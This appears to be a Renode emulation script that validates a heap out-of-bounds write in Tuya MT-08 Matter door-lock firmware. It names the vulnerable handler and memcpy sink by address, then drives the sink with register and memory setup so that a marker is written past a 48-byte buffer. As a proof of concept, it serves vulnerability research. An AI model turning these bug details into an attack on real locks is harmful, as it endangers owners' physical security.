:name: MT-08 Tuya Matter door-lock 0x125DFC32 mfg-cluster HEAP OOB write — validation
:description: Drives the copy sink sub_804A1BC of the real Tuya MT-08 Matter firmware on the emulated EFR32MG24 and demonstrates the unbounded byte-wise memcpy writing attacker-controlled length PAST a heap buffer's declared end (HEAP OOB write, NOT stack/saved-LR).
#
# Bug: mfg-cluster 0x125DFC32 handler sub_8016194 loads a1[6] as an attacker
# length and calls the byte-wise, forward, UNBOUNDED memcpy sink
# sub_804A1BC(dest, src, len) @0x804A1BC. dest is a caller-provided HEAP buffer
# (notional 48 bytes). len is attacker-controlled and never clamped to the
# buffer size, so bytes are written past dest+48 -> HEAP out-of-bounds write.
#
# OPTION B: drive the sink sub_804A1BC directly with a controlled contract.
#   dest = 0x2000E000  (notional 48-byte buffer; declared end = 0x2000E030)
#   src  = 0x2000F000
#   len  = 200 (0xC8)  -> writes dest[0..199], i.e. through 0x2000E0C7
#   Sentinel at dest+48 (0x2000E030) pre-seeded 0xA5A5A5A5; the source byte
#   that lands there (src+48 = 0x2000F030) is the marker 0xDEADBEEF.
#   Confirmation: 0x2000E030 flips 0xA5A5A5A5 -> 0xDEADBEEF (write past end).

$bin=@scripts/silabs-vuln/mt08_tuya.elf
$vtor=0x08008000
include @scripts/silabs-vuln/boot_mg24.resc

emulation RunFor "0.4"
pause

# Belt-and-suspenders: ensure MT-08 vector table base even if include order changes.
sysbus.cpu VectorTableOffset 0x08008000

# --- Destination "heap" buffer @0x2000E000 (notional 48 bytes). ---
#     Clear the in-bounds region and the sentinel word just past the end.
sysbus WriteDoubleWord 0x2000E000 0x00000000
sysbus WriteDoubleWord 0x2000E004 0x00000000
sysbus WriteDoubleWord 0x2000E008 0x00000000
sysbus WriteDoubleWord 0x2000E00C 0x00000000
sysbus WriteDoubleWord 0x2000E010 0x00000000
sysbus WriteDoubleWord 0x2000E014 0x00000000
sysbus WriteDoubleWord 0x2000E018 0x00000000
sysbus WriteDoubleWord 0x2000E01C 0x00000000
sysbus WriteDoubleWord 0x2000E020 0x00000000
sysbus WriteDoubleWord 0x2000E024 0x00000000
sysbus WriteDoubleWord 0x2000E028 0x00000000
sysbus WriteDoubleWord 0x2000E02C 0x00000000
# Sentinel one word PAST the 48-byte buffer end (0x2000E030):
sysbus WriteDoubleWord 0x2000E030 0xA5A5A5A5

# --- Source buffer @0x2000F000. In-bounds 48 bytes = 0xCCCCCCCC. ---
sysbus WriteDoubleWord 0x2000F000 0xCCCCCCCC
sysbus WriteDoubleWord 0x2000F004 0xCCCCCCCC
sysbus WriteDoubleWord 0x2000F008 0xCCCCCCCC
sysbus WriteDoubleWord 0x2000F00C 0xCCCCCCCC
sysbus WriteDoubleWord 0x2000F010 0xCCCCCCCC
sysbus WriteDoubleWord 0x2000F014 0xCCCCCCCC
sysbus WriteDoubleWord 0x2000F018 0xCCCCCCCC
sysbus WriteDoubleWord 0x2000F01C 0xCCCCCCCC
sysbus WriteDoubleWord 0x2000F020 0xCCCCCCCC
sysbus WriteDoubleWord 0x2000F024 0xCCCCCCCC
sysbus WriteDoubleWord 0x2000F028 0xCCCCCCCC
sysbus WriteDoubleWord 0x2000F02C 0xCCCCCCCC
# Marker at src offset 0x30 (=48) -> lands at dest+48 (past the end):
sysbus WriteDoubleWord 0x2000F030 0xDEADBEEF

# --- Call contract for sub_804A1BC(dest=r0, src=r1, len=r2) ---
sysbus.cpu SetRegister 0  0x2000E000
sysbus.cpu SetRegister 1  0x2000F000
sysbus.cpu SetRegister 2  0x000000C8
sysbus.cpu SetRegister 13 0x2001F000
sysbus.cpu SetRegister 14 0x08016195
sysbus.cpu PC 0x804A1BC

echo ">>> OPTION B: HEAP OOB write via unbounded sink sub_804A1BC"
echo ">>> BEFORE: dest+48 sentinel @0x2000E030 (declared buffer end) ="
sysbus ReadDoubleWord 0x2000E030
echo ">>> BEFORE: dest start @0x2000E000 ="
sysbus ReadDoubleWord 0x2000E000

# 200 bytes * ~3 instr/byte + prologue; generous margin so the full copy finishes
sysbus.cpu Step 1600

echo ">>> AFTER: dest+48 sentinel @0x2000E030 (expect 0xDEADBEEF = OOB write) ="
sysbus ReadDoubleWord 0x2000E030
echo ">>> AFTER: dest start @0x2000E000 (expect 0xCCCCCCCC = in-bounds copy) ="
sysbus ReadDoubleWord 0x2000E000
echo ">>> AFTER: PC ="
sysbus.cpu PC
